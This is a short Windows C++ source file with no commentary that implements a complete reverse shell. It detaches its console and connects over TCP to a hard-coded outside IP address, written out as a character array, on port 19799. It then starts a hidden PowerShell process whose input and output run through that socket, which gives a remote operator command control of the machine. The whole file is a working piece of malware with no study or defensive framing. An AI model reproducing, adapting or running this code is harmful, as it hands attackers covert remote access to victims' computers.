#define _WIN32_WINNT 0x501
#include <ws2tcpip.h>
#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <process.h>
#include <iostream>
#include <string>
using namespace std;


#pragma comment(lib, "Ws2_32.lib")
                                         
char  i[11] = { '3'  , '.' , '1' , '4' , '2', '.' , '1' , '6' ,'7' , '.' , '4'  };


#define p "19799"


int main(int argc, char* argv[])
{
	
	FreeConsole();
	WSADATA wsaData;
	int  programme = WSAStartup(MAKEWORD(2, 2), &wsaData);
	struct addrinfo* out = NULL, * ptr = NULL, hints;
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	

	getaddrinfo(i, p, &hints, &out);
	ptr = out;
	SOCKET ConnectSocket = WSASocket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, NULL, NULL);
	connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	STARTUPINFO star;
	PROCESS_INFORMATION pr;
	ZeroMemory(&star, sizeof(star));
	star.cb = sizeof(star);
	ZeroMemory(&pr, sizeof(pr));
	star.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	star.wShowWindow = SW_HIDE;
	star.hStdInput = (HANDLE)ConnectSocket;
	star.hStdOutput = (HANDLE)ConnectSocket;
	star.hStdError = (HANDLE)ConnectSocket;
	TCHAR call[] = TEXT("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
	CreateProcess(NULL, call, NULL, NULL, TRUE, 0, NULL, NULL, &star, &pr);
	WaitForSingleObject(pr.hProcess, INFINITE);
	CloseHandle(pr.hProcess);
	CloseHandle(pr.hThread);
	WSACleanup();
	
}